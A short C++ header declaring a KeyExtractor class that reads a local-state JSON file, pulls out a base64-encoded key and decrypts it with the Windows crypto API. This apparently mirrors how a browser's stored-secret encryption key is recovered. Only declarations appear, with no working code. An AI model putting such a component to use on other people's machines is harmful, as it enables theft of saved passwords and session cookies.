#ifndef KEY_EXTRACTOR_INCLUDES_H
#define KEY_EXTRACTOR_INCLUDES_H

#include <fstream>
#include <Windows.h>
#include <wincrypt.h>
#include "nlohmann/json.hpp" 
#include <cppcodec/base64_rfc4648.hpp>


class KeyExtractor{
    public:
        KeyExtractor(const std::string& localStateFilePath);
        std::vector<unsigned char> extractKey();
    private:
        std::string localStateFilePath;
        std::vector<unsigned char> decryptKey(const std::string& encryptedKey);
        std::string readFile(const std::string& filePath);
        std::string parseJsonForKey(const std::string& jsonData);
        std::vector<unsigned char> decodeBase64(const std::string& encoded);
    
};
#endif // KEY_EXTRACTOR_INCLUDES_H